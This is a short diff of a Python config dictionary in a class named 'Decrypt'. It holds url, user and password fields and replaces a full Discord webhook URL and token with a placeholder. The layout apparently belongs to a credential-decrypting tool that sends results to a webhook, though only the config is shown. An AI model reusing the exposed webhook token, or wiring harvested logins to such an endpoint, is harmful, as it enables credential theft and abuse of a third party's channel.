@@ -77,7 +77,7 @@ class Decrypt:                                                                  
             "url": "",                                                                                                                                                          #  ─┼─ Function that returns a dictionary with values of paths, webhook, and empty values for later use
             "user": "",                                                                                                                                                         #   │
             "password": "",                                                                                                                                                     #   │
-            "webhook": "https://discord.com/api/webhooks/1166067482193297604/QPYWvfRQy6Ks5crVnpQO6D8EdStZh8e8zyf27f7QG5HHmllEKMa1NKUP-yU5cT-PKkUp"                              #   │
+            "webhook": "enter discord webhook here"                                                                                                                             #   │
         }                                                                                                                                                                       #   │
         return config                                                                                                                                                           #   │
                                                                                                                                                                                 #  ─┘
